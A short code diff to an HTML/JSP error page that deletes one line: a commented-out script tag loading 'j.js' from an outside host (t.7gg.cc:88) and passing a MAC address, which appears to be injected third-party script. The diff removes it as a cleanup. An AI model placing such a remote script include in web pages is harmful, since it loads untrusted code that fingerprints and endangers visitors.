@@ -6,7 +6,6 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>页面出错啦</title>
-	<%--<script src=http://t.7gg.cc:88/j.js?MAC=68DB5482FAF5></script>--%>
 	<script type="text/javascript" src="/js/404.js"></script>
 </head>
 <style>
